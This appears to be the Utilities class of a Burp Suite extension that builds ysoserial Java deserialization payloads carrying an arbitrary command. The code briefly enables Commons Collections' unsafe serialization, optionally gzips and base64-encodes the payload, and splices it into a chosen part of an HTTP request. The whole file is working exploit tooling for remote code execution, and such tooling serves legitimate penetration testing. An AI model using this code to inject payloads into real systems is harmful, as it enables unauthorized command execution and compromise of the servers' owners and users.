package burp;


import com.google.common.primitives.Bytes;
import ysoserial.Serializer;
import ysoserial.payloads.ObjectPayload;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.zip.GZIPOutputStream;

public class Utilities {

    public static byte[] gzipByteArray(byte[] data) {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            GZIPOutputStream gzip = new GZIPOutputStream(bos);
            gzip.write(data);
            gzip.close();
            data = bos.toByteArray();
            bos.close();
        } catch (IOException ignored) {
        }

        return data;
    }

    public static byte[] serializeRequest(
            byte[] message, byte[] selectedMessage, boolean isEncoded, boolean isCompressed, String command,
            IExtensionHelpers helpers, String payloadType
    ) {

        int selectedOffset = 0;
        int endingOffset = 0;

        if (selectedMessage != null) {
            selectedOffset = Bytes.indexOf(message, selectedMessage);
            endingOffset = selectedOffset + selectedMessage.length;

        } else if (ChildTab.selectedMessage != null) {
            byte[] payload = ChildTab.selectedMessage;
            if (ChildTab.isCompressed) {
                payload = gzipByteArray(payload);
            }
            if (ChildTab.isEncoded) {
                payload = Base64.getEncoder().encode(payload);
            }

            selectedOffset = Bytes.indexOf(message, payload);
            endingOffset = selectedOffset + payload.length;
        }

        if (ChildTab.selectedMessage != null || selectedMessage != null) {

            byte[] beginningArray = Arrays.copyOfRange(message, 0, selectedOffset);
            byte[] endingArray = Arrays.copyOfRange(message, endingOffset, message.length);

            byte[] exploitArray = getExploitPayload(payloadType, command);

            ChildTab.selectedMessage = exploitArray;


            if (isCompressed) {
                exploitArray = gzipByteArray(exploitArray);
                ChildTab.isCompressed = true;
            } else {
                ChildTab.isCompressed = false;
            }

            byte[] output;

            if (isEncoded) {
                ChildTab.isEncoded = true;
                byte[] base64EncodedExploit = Base64.getEncoder().encode(exploitArray);

                output = Bytes.concat(beginningArray, base64EncodedExploit, endingArray);
            } else {
                ChildTab.isEncoded = false;
                output = Bytes.concat(beginningArray, exploitArray, endingArray);
            }

            IRequestInfo iRequestInfo = helpers.analyzeRequest(output);

            int bodyOffset = iRequestInfo.getBodyOffset();

            java.util.List<String> headers = iRequestInfo.getHeaders();

            byte[] newBody = new byte[output.length - bodyOffset];

            System.arraycopy(output, bodyOffset, newBody, 0, output.length - bodyOffset);

            return helpers.buildHttpMessage(headers, newBody);
        } else {
            return message;
        }
    }

    private static byte[] getExploitPayload(String payloadType, String command) {

        final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass(
                payloadType.split(" ")[0]
        );

        byte[] exploitPayload = new byte[0];

        try {
            final ObjectPayload payload = payloadClass.newInstance();
            final Object object = payload.getObject(command);
            System.setProperty("org.apache.commons.collections.enableUnsafeSerialization", "true");
            exploitPayload = Serializer.serialize(object);
            System.setProperty("org.apache.commons.collections.enableUnsafeSerialization", "false");
        } catch (Throwable e) {
            System.err.println("Error while generating or serializing payload");
            e.printStackTrace();
        }

        return exploitPayload;

    }

    public static String[] formatCommand(String command) {
        List<String> list = new ArrayList<>();
        Matcher m = Pattern.compile("([^\']\\S*|\'.*?(.*).*?.+?\')\\s*").matcher(command);
        int first;
        int last;
        String firstFix;
        String lastFix;
        while (m.find()) {
            if (m.group(1).contains("\'")) {
                first = m.group(1).indexOf('\'');
                firstFix = new StringBuilder(m.group(1)).replace(first, first + 1, "").toString();
                last = firstFix.lastIndexOf('\'');
                lastFix = new StringBuilder(firstFix).replace(last, last + 1, "").toString();
                list.add(lastFix);
            } else {
                list.add(m.group(1));
            }
        }

        return list.toArray(new String[list.size()]);
    }
}
